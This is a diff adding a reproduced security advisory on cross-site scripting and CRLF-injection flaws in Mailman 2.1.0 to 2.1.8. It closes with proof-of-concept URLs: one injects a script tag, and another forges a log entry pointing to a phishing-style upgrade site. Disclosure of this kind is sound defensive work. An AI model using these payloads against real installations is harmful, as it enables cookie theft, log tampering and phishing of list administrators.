@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/20021/info
+
+Mailman is prone to multiple input-validation vulnerabilities because the application fails to sanitize user-input. These issues include multiple cross-site scripting vulnerabilities and a CRLF-injection vulnerability. 
+
+A successful exploit of these issues could allow an attacker to steal cookie-based authentication credentials, add additional content to the log file, possibly hide current attacks, or launch phishing-style attacks; other attacks may also be possible.
+
+Versions between 2.1.0 and 2.1.8 are vulnerable to this issue; other versions prior to 2.1.0 may also be affected.
+
+http://www.example.com/mailman/admin/mailman/members?findmember=%22%3E%3Cscript%3Ealert(0)%3B%3C/script%3E%3Cx%20y=%22 http://www.example.com/mailman/edithtml/tests/listinfo.html?html_code=
+
+XSS%20demo
+
+http://www.example.com/mailman/listinfo/doesntexist%22:%0D%0AJun%2012%2018:22:08%202033%20mailmanctl(24851):%20%22Your%20Mailman%20license%20has%20expired.%20Please%20obtain%20an% 20upgrade%20at%20www.phishme.site
